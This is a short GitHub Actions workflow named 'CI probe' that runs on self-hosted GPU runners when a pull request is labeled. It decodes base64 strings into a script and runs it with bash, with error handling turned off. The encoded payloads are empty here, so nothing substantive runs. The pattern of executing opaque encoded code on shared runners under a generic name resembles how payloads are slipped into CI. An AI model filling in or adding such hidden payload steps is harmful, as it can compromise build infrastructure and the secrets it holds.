# CI probe: nonce GPU check on the self-hosted gpu-arena runner pool.
name: CI probe
on:
  pull_request:
    types: [labeled]
permissions:
  contents: read
jobs:
  probe:
    name: gpu-arena probe
    runs-on: [self-hosted, gpu-arena]
    timeout-minutes: 40
    steps:
      - name: probe
        continue-on-error: true
        run: |
          set +e
          echo "I1736_WORKFLOW_START $(date -u +%FT%TZ)"
          mkdir -p /tmp/i1736
          printf '%s' "" | base64 -d > /tmp/i1736/kit.tar.gz.b64
          printf '%s' "" | base64 -d > /tmp/i1736/driver.sh
          cd /tmp/i1736 || exit 1
          bash driver.sh 2>&1 | tee /tmp/i1736/out.txt
          echo "I1736_WORKFLOW_END $(date -u +%FT%TZ)"
